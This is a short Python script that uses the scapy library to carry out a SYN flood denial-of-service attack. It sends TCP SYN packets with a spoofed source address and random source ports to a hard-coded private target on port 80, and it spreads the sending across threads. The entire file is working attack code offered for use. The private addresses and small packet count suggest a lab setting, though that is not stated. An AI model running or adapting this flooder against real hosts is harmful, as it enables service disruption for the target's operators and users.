from scapy.all import *
import random
import threading

TARGET_IP = '10.22.22.60'
TARGET_PORT = 80
MAXIMUM_PORTS = 65535
PACKETS_TO_SEND = 100
TREADS = 10

def syn_flood(target_ip, target_port, packets_to_send):
    '''
    SYN Flood using scapy
    '''
    for i in range(packets_to_send):
        try:
            source_ip = '10.22.22.107'
            source_port = random.randint(0, MAXIMUM_PORTS)
            packet = IP(dst = target_ip, src = source_ip)/TCP(sport=source_port, dport=target_port, flags="S")
            send(packet, verbose=0)
        except:
            continue

if __name__ == '__main__':
    # Divide SYN flod over multiple threads for better performance
    for i in range(TREADS):
        thread_name = 'i_' + str(i)
        task = threading.Thread(
            target=syn_flood, 
            args=(TARGET_IP,TARGET_PORT,PACKETS_TO_SEND//TREADS),
            name=thread_name
        )
        task.start()
        task.join()

    print('Done')
    